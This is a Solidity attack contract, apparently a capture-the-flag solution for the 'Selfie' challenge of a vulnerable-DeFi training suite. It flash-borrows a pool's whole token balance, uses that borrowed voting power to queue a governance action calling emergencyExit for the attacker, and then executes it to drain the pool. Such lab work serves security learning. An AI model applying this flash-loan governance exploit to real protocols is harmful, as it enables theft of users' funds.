pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/ISimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract AttackSelfie {
    address _owner;
    SelfiePool _pool;
    address _token;
    ISimpleGovernance _governance;
    uint256 public _actionId;

    constructor(address owner, address pool, address governance, address token) {
        _owner = owner;
        _token = token;
        _pool = SelfiePool(pool);
        _governance = ISimpleGovernance(governance);
    }


    function attackQueueAction() public  {
        require(msg.sender == _owner, "not owner");

        uint256 amount = _pool.token().balanceOf(address(_pool));
        
        bytes memory _calldata = abi.encodeWithSignature("emergencyExit(address)", address(this));
        
        _pool.flashLoan(IERC3156FlashBorrower(address(this)), _token, amount, _calldata);
    }


    function attackQueueExecute() public {
        require(msg.sender == _owner, "not owner");

        _governance.executeAction(_actionId);
    }


    function onFlashLoan(address borrower, address token, uint256 amount, uint256 fee, bytes calldata _data) external returns (bytes32) {
        _actionId = _governance.queueAction(borrower, uint128(amount), _data);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}